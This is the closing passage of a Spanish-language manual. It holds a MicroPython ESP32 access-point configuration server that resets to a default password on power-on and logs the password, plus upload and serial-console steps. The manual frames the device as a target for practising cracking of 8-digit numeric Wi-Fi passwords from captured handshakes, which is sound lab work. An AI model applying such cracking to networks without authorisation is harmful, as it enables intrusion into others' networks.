&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; client_socket.send(</span><span class="c5">&quot;HTTP/1.1 400 Bad Request\r\nContent-Type: text/plain\r\nConnection: close\r\n\r\nBad Request: No body in POST&quot;</span><span class="c0">)</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c3">except</span><span class="c0">&nbsp;OSError:</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c3">pass</span></p><p class="c2 c8"><span class="c0"></span></p><p class="c2 c8"><span class="c0"></span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c3">else</span><span class="c0">:</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c9"># Method or path not supported</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; print(</span><span class="c5">f&quot;Method Not Allowed: </span><span class="c15">{method}</span><span class="c5">&nbsp;</span><span class="c15">{path}</span><span class="c5">&quot;</span><span class="c1">) </span><span class="c9"># Debug print</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; client_socket.send(</span><span class="c5">&quot;HTTP/1.1 405 Method Not Allowed\r\nContent-Type: text/plain\r\nConnection: close\r\n\r\nMethod Not Allowed&quot;</span><span class="c0">)</span></p><p class="c2 c8"><span class="c0"></span></p><p class="c2"><span class="c1">&nbsp; &nbsp; </span><span class="c3">except</span><span class="c1">&nbsp;OSError </span><span class="c3">as</span><span class="c0">&nbsp;e:</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c9"># Catch socket errors (client disconnects, timeouts after sending data)</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c9"># These are common and often not critical when client closes connection</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c9"># print(f&quot;Socket or OS error during request handling: {e}&quot;) # Uncomment for detailed socket debug</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c3">pass</span><span class="c1">&nbsp;</span><span class="c9"># Suppress common socket errors to avoid spamming console</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; </span><span class="c3">except</span><span class="c1">&nbsp;Exception </span><span class="c3">as</span><span class="c0">&nbsp;e:</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c9"># Catch any other unexpected Python errors</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;print(</span><span class="c5">f&quot;An unexpected error occurred during request handling: </span><span class="c15">{e}</span><span class="c5">&quot;</span><span class="c1">) </span><span class="c9"># Important error debug</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c9"># Attempt to send a 500 Internal Server Error response</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c3">try</span><span class="c0">:</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;client_socket.send(</span><span class="c5">&quot;HTTP/1.1 500 Internal Server Error\r\nContent-Type: text/plain\r\nConnection: close\r\n\r\nInternal Server Error\nSee device console for details.&quot;</span><span class="c0">)</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c3">except</span><span class="c0">&nbsp;OSError:</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c3">pass</span><span class="c1">&nbsp;</span><span class="c9"># Ignore if socket already closed</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; </span><span class="c3">finally</span><span class="c0">:</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c9"># Ensure the socket is closed</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c3">try</span><span class="c0">:</span></p><p class="c2"><span class="c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; client_socket.close()</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c9"># print(&quot;Client socket closed.&quot;) # Debug print</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c3">except</span><span class="c0">&nbsp;OSError:</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c3">pass</span><span class="c1">&nbsp;</span><span class="c9"># Ignore if socket already closed</span></p><p class="c2 c8"><span class="c0"></span></p><p class="c2 c8"><span class="c0"></span></p><p class="c2"><span class="c3">def</span><span class="c1">&nbsp;</span><span class="c12">main</span><span class="c0">():</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; </span><span class="c5">&quot;&quot;&quot;Main function to start the web server.&quot;&quot;&quot;</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; print(</span><span class="c5">&quot;Starting ESP32 AP configuration...&quot;</span><span class="c1">) </span><span class="c9"># Debug print</span></p><p class="c2 c8"><span class="c0"></span></p><p class="c2"><span class="c1">&nbsp; &nbsp; </span><span class="c9"># --- Detectar Power-On Reset y borrar archivo ---</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; </span><span class="c9"># Importante: machine.reset_cause() debe ser llamado pronto en el script</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; </span><span class="c9"># ANTES de que se produzcan otros reinicios por software o excepciones no manejadas</span></p><p class="c2"><span class="c0">&nbsp; &nbsp; reset_reason = machine.reset_cause()</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; print(</span><span class="c5">f&quot;Reset cause: </span><span class="c15">{reset_reason}</span><span class="c5">&quot;</span><span class="c1">) </span><span class="c9"># Debug print</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; </span><span class="c3">if</span><span class="c0">&nbsp;reset_reason == machine.PWRON_RESET:</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; print(</span><span class="c5">&quot;Detected Power-On Reset. Deleting password file for initial setup (password will be default).&quot;</span><span class="c0">)</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c3">try</span><span class="c0">:</span></p><p class="c2"><span class="c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; uos.remove(PASSWORD_FILE)</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; print(</span><span class="c5">f&quot;Successfully deleted &#39;</span><span class="c15">{PASSWORD_FILE}</span><span class="c5">&#39;.&quot;</span><span class="c0">)</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c3">except</span><span class="c0">&nbsp;OSError:</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c9"># This is expected on the absolute first boot or if file was already deleted</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; print(</span><span class="c5">f&quot;&#39;</span><span class="c15">{PASSWORD_FILE}</span><span class="c5">&#39; not found or could not be deleted on Power-On Reset (this is okay).&quot;</span><span class="c0">)</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c9"># Add a small delay just in case the filesystem needs a moment after deletion</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; time.sleep(</span><span class="c6">0.1</span><span class="c1">) </span><span class="c9"># Reduced delay slightly, adjust if needed</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; </span><span class="c3">else</span><span class="c0">:</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; print(</span><span class="c5">f&quot;Reset cause is not Power-On (</span><span class="c15">{reset_reason}</span><span class="c5">). Keeping existing password file if it exists.&quot;</span><span class="c0">)</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; </span><span class="c9"># --- FIN NUEVO BLOQUE ---</span></p><p class="c2 c8"><span class="c0"></span></p><p class="c2 c8"><span class="c0"></span></p><p class="c2"><span class="c1">&nbsp; &nbsp; </span><span class="c9"># Load password from file or use default</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; </span><span class="c9"># load_password function now handles file not found or invalid content</span></p><p class="c2"><span class="c0">&nbsp; &nbsp; initial_password = load_password()</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; print(</span><span class="c5">f&quot;Using initial password for AP setup: </span><span class="c15">{initial_password}</span><span class="c5">&quot;</span><span class="c1">) </span><span class="c9"># Debug print</span></p><p class="c2 c8"><span class="c0"></span></p><p class="c2 c8"><span class="c0"></span></p><p class="c2"><span class="c1">&nbsp; &nbsp; </span><span class="c9"># Configure the AP with the loaded/default password</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; </span><span class="c9"># setup_access_point function now includes retry logic and exits on fatal failure</span></p><p class="c2"><span class="c0">&nbsp; &nbsp; setup_access_point(initial_password)</span></p><p class="c2 c8"><span class="c0"></span></p><p class="c2"><span class="c1">&nbsp; &nbsp; </span><span class="c9"># Create the server socket</span></p><p class="c2"><span class="c0">&nbsp; &nbsp; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, </span><span class="c6">1</span><span class="c1">) &nbsp;</span><span class="c9"># Allow socket reuse</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; </span><span class="c9"># Set a timeout for accept so the main loop can be interrupted (e.g., by Ctrl+C)</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; s.settimeout(</span><span class="c6">1.0</span><span class="c1">) </span><span class="c9"># 1 second timeout</span></p><p class="c2 c8"><span class="c0"></span></p><p class="c2"><span class="c1">&nbsp; &nbsp; </span><span class="c3">try</span><span class="c0">:</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; s.bind((</span><span class="c5">&#39;0.0.0.0&#39;</span><span class="c1">, </span><span class="c6">80</span><span class="c1">)) &nbsp;</span><span class="c9"># Listen on all interfaces on port 80</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; s.listen(</span><span class="c6">5</span><span class="c1">) &nbsp;</span><span class="c9"># Allow up to 5 simultaneous connections</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; print(</span><span class="c5">&quot;Socket bound and listening.&quot;</span><span class="c1">) </span><span class="c9"># Debug print</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; </span><span class="c3">except</span><span class="c1">&nbsp;Exception </span><span class="c3">as</span><span class="c0">&nbsp;e:</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; print(</span><span class="c5">f&quot;Failed to bind or listen socket: </span><span class="c15">{e}</span><span class="c5">&quot;</span><span class="c1">) </span><span class="c9"># Debug print</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; ap.active(</span><span class="c6">False</span><span class="c1">) </span><span class="c9"># Ensure AP is turned off</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; sys.exit() </span><span class="c9"># Exit the script if socket fails</span></p><p class="c2 c8"><span class="c0"></span></p><p class="c2"><span class="c1">&nbsp; &nbsp; print(</span><span class="c5">&quot;Web server listening on port 80...&quot;</span><span class="c1">) </span><span class="c9"># Debug print</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; print(</span><span class="c5">&quot;Ready to accept connections.&quot;</span><span class="c1">) </span><span class="c9"># Debug print</span></p><p class="c2 c8"><span class="c0"></span></p><p class="c2 c8"><span class="c0"></span></p><p class="c2"><span class="c1">&nbsp; &nbsp; </span><span class="c3">try</span><span class="c0">:</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c3">while</span><span class="c1">&nbsp;</span><span class="c6">True</span><span class="c0">:</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c9"># Accept new client connections</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c3">try</span><span class="c0">:</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c9"># print(&quot;Waiting for client connection...&quot;) # Debug print (can be noisy)</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; client_socket, addr = s.accept() </span><span class="c9"># This call can raise OSError 110 (ETIMEDOUT) or 116</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; print(</span><span class="c5">f&quot;Client connected from </span><span class="c15">{addr[</span><span class="c6">0</span><span class="c15">]}</span><span class="c5">:</span><span class="c15">{addr[</span><span class="c6">1</span><span class="c15">]}</span><span class="c5">&quot;</span><span class="c1">) </span><span class="c9"># Debug print</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c9"># Handle the client request</span></p><p class="c2"><span class="c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; handle_request(client_socket)</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c9"># Catch OSError for socket accept operations</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c3">except</span><span class="c1">&nbsp;OSError </span><span class="c3">as</span><span class="c0">&nbsp;e:</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c9"># Check if the error is ETIMEDOUT (error code 110 or 116)</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c3">if</span><span class="c1">&nbsp;</span><span class="c10">len</span><span class="c1">(e.args) &gt; </span><span class="c6">0</span><span class="c1">&nbsp;</span><span class="c3">and</span><span class="c1">&nbsp;e.args[</span><span class="c6">0</span><span class="c1">] </span><span class="c3">in</span><span class="c1">&nbsp;(</span><span class="c6">110</span><span class="c1">, </span><span class="c6">116</span><span class="c0">):</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c9"># print(&quot;Socket accept timed out (OSError 110/116), looping...&quot;) # Debug print (can be noisy)</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c3">pass</span><span class="c1">&nbsp;</span><span class="c9"># Timeout is expected when using settimeout, just continue the loop</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c3">else</span><span class="c0">:</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c9"># Handle other OS errors during accept</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; print(</span><span class="c5">f&quot;Other OSError during socket accept: </span><span class="c15">{e}</span><span class="c5">&quot;</span><span class="c1">) </span><span class="c9"># Debug print</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c9"># For critical errors, might want to break loop or exit</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c9"># break # Example: break loop on other OS errors</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c3">except</span><span class="c1">&nbsp;Exception </span><span class="c3">as</span><span class="c0">&nbsp;e:</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c9"># Catch any other unexpected Python errors during accept</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; print(</span><span class="c5">f&quot;\nAn unexpected error occurred in main loop during accept: </span><span class="c15">{e}</span><span class="c5">&quot;</span><span class="c1">) </span><span class="c9"># Important error debug</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c9"># Consider if this should break the loop or exit depending on severity</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c9"># break # Example: break loop on other exceptions</span></p><p class="c2 c8"><span class="c0"></span></p><p class="c2 c8"><span class="c0"></span></p><p class="c2"><span class="c1">&nbsp; &nbsp; </span><span class="c3">except</span><span class="c0">&nbsp;KeyboardInterrupt:</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; print(</span><span class="c5">&quot;\nServer stopped by user (KeyboardInterrupt).&quot;</span><span class="c1">) </span><span class="c9"># Debug print</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; </span><span class="c3">except</span><span class="c1">&nbsp;Exception </span><span class="c3">as</span><span class="c1">&nbsp;e: </span><span class="c9"># This outer catch block is less likely to be hit with the inner one</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; print(</span><span class="c5">f&quot;\nAn unexpected error occurred in main loop: </span><span class="c15">{e}</span><span class="c5">&quot;</span><span class="c1">) </span><span class="c9"># Important error debug</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; </span><span class="c3">finally</span><span class="c0">:</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; print(</span><span class="c5">&quot;Closing server socket and deactivating AP.&quot;</span><span class="c1">) </span><span class="c9"># Debug print</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; s.close() &nbsp;</span><span class="c9"># Close the server socket</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; ap.active(</span><span class="c6">False</span><span class="c1">) &nbsp;</span><span class="c9"># Deactivate the access point on exit</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; print(</span><span class="c5">&quot;Cleanup complete. Script finished.&quot;</span><span class="c1">) </span><span class="c9"># Debug print</span></p><p class="c2 c8"><span class="c0"></span></p><p class="c2 c8"><span class="c0"></span></p><p class="c2"><span class="c3">if</span><span class="c1">&nbsp;__name__ == </span><span class="c5">&quot;__main__&quot;</span><span class="c0">:</span></p><p class="c25"><span class="c1">&nbsp; &nbsp; main()</span></p><p class="c16"><span class="c20 c11">C&oacute;mo Cargar el Script MicroPython y Ver su Salida (desde macOS Terminal):</span></p><ol class="c23 lst-kix_8nfbjxgdqd5j-0 start" start="1"><li class="c4 c14 li-bullet-0"><span class="c11 c21">Conecta tu ESP32 al Mac:</span><span class="c7 c11">&nbsp;Usa el cable USB.</span></li><li class="c4 c14 li-bullet-0"><span class="c11 c21">Identifica el puerto serial:</span><span class="c11">&nbsp;Ejecuta </span><span class="c13">ls /dev/cu.*</span><span class="c11">&nbsp;antes y despu&eacute;s de conectar el ESP32 para encontrar el nombre del puerto (ej. </span><span class="c13">/dev/tty.usbmodem101</span><span class="c11">&nbsp;o </span><span class="c13">/dev/cu.usbmodem101</span><span class="c7 c11">).</span></li><li class="c29 c14 li-bullet-0"><span class="c11 c21">Carga el script:</span><span class="c11">&nbsp;Guarda el c&oacute;digo MicroPython anterior en un archivo llamado </span><span class="c13">main.py</span><span class="c11">&nbsp;en tu ordenador. Luego, usa </span><span class="c13">ampy</span><span class="c11">&nbsp;para cargarlo:<br></span><span class="c28">ampy --port /dev/cu</span><span class="c30">.usbmodem101</span><span class="c28">&nbsp;put </span><span class="c34">main</span><span class="c30">.py</span></li><li class="c4 c14 li-bullet-0"><span class="c11">(Reemplaza </span><span class="c13">/dev/cu.usbmodem101</span><span class="c7 c11">&nbsp;con tu puerto real).</span></li><li class="c14 c29 li-bullet-0"><span class="c11 c21">Abre la consola serial:</span><span class="c11">&nbsp;Usa </span><span class="c13">screen</span><span class="c11">&nbsp;para conectarte al REPL y ver la salida del script:<br></span><span class="c7 c28">screen /dev/cu.usbmodem101 115200</span></li><li class="c4 c14 li-bullet-0"><span class="c11">(Reemplaza </span><span class="c13">/dev/cu.usbmodem101</span><span class="c7 c11">&nbsp;con tu puerto real). La terminal se pondr&aacute; en blanco.</span></li><li class="c4 c14 li-bullet-0"><span class="c11 c21">Reinicia el ESP32 (Hardware Reset):</span><span class="c7 c11">&nbsp;Desconecta el cable USB y vuelve a conectarlo.</span></li><li class="c4 c14 li-bullet-0"><span class="c11 c21">Observa la salida:</span><span class="c7 c11">&nbsp;Ver&aacute;s el proceso de arranque de MicroPython y la ejecuci&oacute;n de tu script en la terminal. Deber&iacute;as ver los mensajes de debug que te gu&iacute;an a trav&eacute;s del proceso de configuraci&oacute;n del AP y la operaci&oacute;n del servidor web.</span></li></ol><p class="c16"><span class="c11">Para salir de </span><span class="c13">screen</span><span class="c11">, presiona </span><span class="c13">Ctrl+A</span><span class="c11">&nbsp;y luego </span><span class="c13">K</span><span class="c11">, y confirma con </span><span class="c13">Y</span><span class="c7 c11">.</span></p><hr><p class="c2 c8"><span class="c7 c27"></span></p><p class="c19"><span class="c7 c11">Este manual te proporciona la informaci&oacute;n sobre los dispositivos, la herramienta para probar la vulnerabilidad de 8 d&iacute;gitos num&eacute;ricos (si capturas un handshake) y un entorno configurable en tu propio ESP32 para realizar pruebas &eacute;ticas y controladas.</span></p><p class="c2 c8"><span class="c7 c27"></span></p></body></html>